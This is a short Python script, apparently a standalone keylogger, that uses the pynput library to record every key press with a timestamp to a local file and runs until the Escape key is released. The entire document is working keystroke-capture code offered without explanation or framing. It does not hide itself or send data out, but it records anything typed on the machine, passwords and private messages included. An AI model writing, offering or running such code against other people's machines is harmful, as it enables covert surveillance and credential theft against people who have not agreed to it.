from pynput.keyboard import Key, Listener
import logging

logging.basicConfig(filename="key_log.txt", level=logging.DEBUG, format='%(message)s : %(asctime)s')
print("Running....")
def while_press(key):
    KEY = f"({key}) is pressed at "
    logging.info(KEY)

def while_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=while_press, on_release=while_release) as listener:
    listener.join()
